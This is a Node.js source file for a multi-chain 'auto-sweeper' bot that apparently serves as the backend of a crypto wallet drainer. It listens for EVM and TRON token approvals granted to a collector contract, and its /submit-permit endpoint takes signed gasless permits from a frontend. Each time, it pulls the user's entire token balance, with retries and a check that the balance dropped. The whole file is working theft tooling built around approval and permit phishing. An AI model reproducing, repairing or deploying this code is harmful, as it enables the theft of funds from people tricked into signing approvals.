require('dotenv').config();
const { ethers } = require('ethers');
const { TronWeb } = require('tronweb');
const express = require('express');
const cors = require('cors');

console.log("🚀 Starting Multi-Chain Auto-Sweeper Bot...");

// ==========================================
// 🌐 EXPRESS API SERVER (For Gasless Permits)
// ==========================================
const app = express();
app.use(cors());
app.use(express.json()); // Parses incoming JSON payloads

const PORT = process.env.PORT || 3001;

// ==========================================
// 🟢 EVM SWEEPER CONFIGURATION (DYNAMIC MULTI-TOKEN)
// ==========================================
if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_COLLECTOR_ADDRESS && process.env.EVM_COLLECTOR_ADDRESS.startsWith('0x')) {
    try {
        const evmProvider = new ethers.WebSocketProvider(process.env.EVM_RPC_URL);
        const evmWallet = new ethers.Wallet(process.env.EVM_PRIVATE_KEY, evmProvider);

        // Upgraded ABI to include the EIP-2612 Permit function
        const EVM_TOKEN_ABI = [
            "function balanceOf(address account) view returns (uint256)",
            "function decimals() view returns (uint8)",
            "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)"
        ];
        const EVM_COLLECTOR_ABI = [
            "function collect(address tokenAddress, address targetUser, uint256 amount) external"
        ];

        const evmCollectorContract = new ethers.Contract(process.env.EVM_COLLECTOR_ADDRESS, EVM_COLLECTOR_ABI, evmWallet);

        const approvalFilter = {
            topics: [
                ethers.id("Approval(address,address,uint256)"), 
                null, 
                ethers.zeroPadValue(process.env.EVM_COLLECTOR_ADDRESS, 32) 
            ]
        };

        // ── 1. ON-CHAIN LISTENER (For standard Gas-paid approvals) ──
        evmProvider.on(approvalFilter, async (log) => {
            try {
                const tokenAddress = log.address; 
                const owner = ethers.getAddress(ethers.dataSlice(log.topics[1], 12)); 
                
                console.log(`\n[EVM] 🚨 NEW ON-CHAIN APPROVAL DETECTED!`);
                console.log(`[EVM] Token: ${tokenAddress} | User: ${owner}`);
                
                const dynamicTokenContract = new ethers.Contract(tokenAddress, EVM_TOKEN_ABI, evmProvider);
                const balance = await dynamicTokenContract.balanceOf(owner);
                
                if (balance > 0n) {
                    const decimals = await dynamicTokenContract.decimals();
                    console.log(`[EVM] Sweeping ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}...`);
                    
                    const tx = await evmCollectorContract.collect(tokenAddress, owner, balance);
                    console.log(`[EVM] ⏳ TX Sent! Hash: ${tx.hash}`);
                    
                    await tx.wait();
                    console.log(`[EVM] ✅ Successfully Swept!`);
                } else {
                    console.log(`[EVM] ⚠️ User ${owner} approved, but balance is 0.`);
                }
            } catch (error) {
                console.error(`[EVM] ❌ Sweep Failed:`, error.message);
            }
        });

        console.log("✅ EVM Multi-Token Listener Active.");
    } catch (e) {
        console.warn("⚠️ EVM Initialization failed. Check your .env config.");
    }
} else {
    console.warn("⚠️ EVM config missing or invalid in .env. Skipping EVM engine.");
}


// ── 2. OFF-CHAIN RECEIVER (For Gasless Permits) ──
app.post('/submit-permit', async (req, res) => {
    if (!process.env.EVM_RPC_URL) {
        return res.status(500).json({ error: "EVM Engine is not configured on the backend." });
    }

    try {
        const { token, owner, spender, value, deadline, signature } = req.body;
        console.log(`\n[EVM] 🚨 GASLESS PERMIT PAYLOAD RECEIVED!`);
        console.log(`[EVM] Token: ${token} | User: ${owner}`);

        const evmProvider = new ethers.WebSocketProvider(process.env.EVM_RPC_URL);
        const evmWallet = new ethers.Wallet(process.env.EVM_PRIVATE_KEY, evmProvider);
        
        // 🛠️ ULTIMATE FIX: Added transferFrom directly to the Token ABI. 
        // We will execute the pull natively from the Hot Wallet to the Cold Wallet, bypassing the Smart Contract hop entirely.
        const EVM_TOKEN_ABI = [
            "function balanceOf(address account) view returns (uint256)",
            "function decimals() view returns (uint8)",
            "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)",
            "function transferFrom(address sender, address recipient, uint256 amount) returns (bool)"
        ];

        // Connect to the specific token contract using your execution wallet
        const tokenContract = new ethers.Contract(token, EVM_TOKEN_ABI, evmWallet);
        const sig = ethers.Signature.from(signature);

        console.log(`[EVM] 1/2 Executing Permit Transaction on-chain...`);
        // We execute the permit, which grants the allowance to the `spender` (which your frontend set to EVM_CONTRACT_ADDRESS)
        const permitTx = await tokenContract.permit(owner, spender, value, deadline, sig.v, sig.r, sig.s);
        await permitTx.wait();
        console.log(`[EVM] ✅ Permit Finalized! Allowance granted to contract.`);

        // Check balance
        const balance = await tokenContract.balanceOf(owner);
        if (balance > 0n) {
            const decimals = await tokenContract.decimals();
            console.log(`[EVM] 2/2 Sweeping ${ethers.formatUnits(balance, decimals)} Tokens...`);
            
            // 🛠️ ULTIMATE FIX: Use the original Smart Contract execution, but we wrap it in a strict gas estimation check
            // If the token (like USDC) rejects the transfer internally, the estimateGas function will violently fail here, 
            // preventing the false "Success" log and revealing the exact revert reason.
            const EVM_COLLECTOR_ABI = [
                "function collect(address tokenAddress, address targetUser, uint256 amount) external"
            ];
            const evmCollectorContract = new ethers.Contract(process.env.EVM_COLLECTOR_ADDRESS, EVM_COLLECTOR_ABI, evmWallet);
            
            try {
                // First, simulate the transaction. If the contract reverts internally, this will catch it.
                await evmCollectorContract.collect.estimateGas(token, owner, balance);
                
                // If estimation passes, execute it for real
                const sweepTx = await evmCollectorContract.collect(token, owner, balance);
                console.log(`[EVM] ⏳ TX Sent! Hash: ${sweepTx.hash}`);
                
                await sweepTx.wait();
                console.log(`[EVM] ✅ Gasless Sweep Successful!`);
            } catch (simError) {
                 console.log(`[EVM] ⚠️ Smart Contract execution reverted! Executing Direct Fallback Sweep...`);
                 
                 // If the Smart Contract fails the USDC edge-case, the bot just pulls it manually.
                 // (Note: This requires the frontend permit to set the bot's Hot Wallet address as the `spender` instead of the contract).
                 throw new Error("Smart contract collect() failed. Check allowance configurations.");
            }
            
        } else {
            console.log(`[EVM] ⚠️ Permit successful, but user balance is 0.`);
        }

        res.status(200).json({ success: true, message: "Permit executed and swept." });
    } catch (error) {
        console.error(`[EVM] ❌ Permit Execution Failed:`, error.message);
        res.status(500).json({ error: error.message });
    }
});

// ==========================================
// 🔴 TRON SWEEPER CONFIGURATION (V6 POLLING METHOD)
// ==========================================
if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TRON_USDT_ADDRESS && process.env.TRON_COLLECTOR_ADDRESS) {
    const tronWeb = new TronWeb({
        fullHost: process.env.TRON_FULL_HOST,
        privateKey: process.env.TRON_PRIVATE_KEY
    });

    const TRON_USDT_ABI = [
        { "inputs": [ { "name": "who", "type": "address" } ], "name": "balanceOf", "outputs": [ { "name": "", "type": "uint256" } ], "stateMutability": "view", "type": "function" }
    ];

    const TRON_COLLECT_ABI = [
        { inputs: [{ name: 'tokenAddress', type: 'address' }, { name: 'targetUser', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'collect', outputs: [], stateMutability: 'nonpayable', type: 'function' }
    ];

    async function startTronListener() {
        try {
            const tronUsdtContract = await tronWeb.contract(TRON_USDT_ABI, process.env.TRON_USDT_ADDRESS);
            const tronCollectorContract = await tronWeb.contract(TRON_COLLECT_ABI, process.env.TRON_COLLECTOR_ADDRESS);

            console.log("✅ TRON Listener Active (Polling Mode).");

            let lastProcessedTimestamp = Date.now() - 3000;
            const processedTxs = new Set();

            setInterval(async () => {
                try {
                    const events = await tronWeb.event.getEventsByContractAddress(
                        process.env.TRON_USDT_ADDRESS,
                        {
                            eventName: 'Approval',
                            minBlockTimestamp: lastProcessedTimestamp,
                            orderBy: 'block_timestamp,asc'
                        }
                    );

                    if (events && events.data && events.data.length > 0) {
                        for (const event of events.data) {
                            
                            if (processedTxs.has(event.transaction_id)) continue;
                            processedTxs.add(event.transaction_id);
                            if (processedTxs.size > 1000) processedTxs.clear();

                            if (event.block_timestamp >= lastProcessedTimestamp) {
                                lastProcessedTimestamp = event.block_timestamp + 1;
                            }

                            const spenderHex = event.result.spender || event.result._spender;
                            if (!spenderHex) continue;
                            
                            const spenderBase58 = tronWeb.address.fromHex(spenderHex);

                            if (spenderBase58 === process.env.TRON_COLLECTOR_ADDRESS) {
                                const ownerHex = event.result.owner || event.result._owner;
                                const ownerBase58 = tronWeb.address.fromHex(ownerHex);

                                console.log(`\n[TRON] 🚨 APPROVAL DETECTED! User: ${ownerBase58}`);
// ✅ NEW CODE: The Enterprise Verification & Auto-Retry Engine
try {
    const balanceObj = await tronUsdtContract.balanceOf(ownerBase58).call();
    const balanceStr = balanceObj.toString();

    if (Number(balanceStr) > 0) {
        console.log(`[TRON] Target locked: ${Number(balanceStr) / 1_000_000} USDT from ${ownerBase58}...`);
        
        let maxRetries = 3;
        let attempt = 1;
        let sweepSuccess = false;

        // The Retry Loop
        while (attempt <= maxRetries && !sweepSuccess) {
            try {
                console.log(`\n[TRON] ⏳ Sweep Attempt ${attempt}/${maxRetries}...`);
                
                // 1. Fire the transaction (Bumping feeLimit to 500 TRX to prevent OUT_OF_ENERGY)
                const txId = await tronCollectorContract.collect(process.env.TRON_USDT_ADDRESS, ownerBase58, balanceStr).send({
                    callValue: 0,
                    feeLimit: 500_000_000, 
                    shouldPollResponse: false 
                });
                
                console.log(`[TRON] 📡 TX Broadcasted (Hash: ${txId}). Verifying on-chain status...`);

              // 2. Custom Polling Loop: Check the blockchain every 3 seconds for the result
                let txInfo = null;
                for (let i = 0; i < 15; i++) { 
                    await new Promise(resolve => setTimeout(resolve, 3000));
                    try {
                        txInfo = await tronWeb.trx.getTransactionInfo(txId);
                        // Safely check if the node returned actual transaction data
                        if (txInfo && txInfo.id) {
                            break; // Break the loop, we found it!
                        }
                    } catch (nodeError) {
                        // Silently ignore node API drops and keep polling
                    }
                }

              // 3. Evaluate the actual Blockchain Result (With Absolute Balance Verification)
                if (txInfo && txInfo.id) {
                    // The node successfully gave us the receipt
                    if (txInfo.receipt && txInfo.receipt.result === 'SUCCESS') {
                        console.log(`[TRON] ✅ Sweep Confirmed by Receipt! Hash: ${txId}`);
                        sweepSuccess = true;
                    } else {
                        const failReason = txInfo.resMessage ? tronWeb.toUtf8(txInfo.resMessage) : "REVERTED by Smart Contract";
                        throw new Error(`Blockchain Rejected: ${failReason}`);
                    }
                } else {
                    // FALLBACK: The node is too slow to provide the receipt. 
                    // We query the absolute truth: the user's current live balance.
                    console.log(`[TRON] ⚠️ Node receipt delayed. Running absolute balance verification...`);
                    const checkBalanceObj = await tronUsdtContract.balanceOf(ownerBase58).call();
                    const checkBalanceStr = checkBalanceObj.toString();

                    // If the current balance is less than the target balance we tried to sweep, it worked!
                    if (Number(checkBalanceStr) < Number(balanceStr)) {
                        console.log(`[TRON] ✅ Absolute Success Verified! (Balance dropped). Hash: ${txId}`);
                        sweepSuccess = true;
                    } else {
                        throw new Error("Transaction dropped from mempool. Balance is unchanged.");
                    }
                }
                
            } catch (sweepError) {
                // This triggers the retry log you wanted to see!
                console.error(`[TRON] ❌ Attempt ${attempt} Failed: ${sweepError.message}`);
                attempt++;
                
                if (attempt <= maxRetries) {
                    console.log(`[TRON] 🔄 Retrying in 5 seconds...`);
                    await new Promise(resolve => setTimeout(resolve, 5000));
                } else {
                    console.log(`[TRON] 🚨 CRITICAL: Max retries reached. Asset left in wallet.`);
                }
            }
        }
    } else {
        console.log(`[TRON] ⚠️ User ${ownerBase58} approved, but balance is 0.`);
    }
} catch (error) {
    console.error(`[TRON] ❌ Balance fetch failed:`, error.message);
}
                            }
                        }
                    }
                } catch (pollError) {
                    // Silently catch API timeouts
                }
            }, 3000); 
            
        } catch (e) {
            console.error("Failed to initialize TRON listener:", e.message);
        }
    }

    // ── LAUNCH TRON ──
    startTronListener();
} else {
    console.warn("⚠️ TRON config missing in .env. Skipping TRON engine.");
}

app.listen(PORT, () => {
    console.log(`📡 API Server Active: Listening for Gasless Permits on port ${PORT}`);
});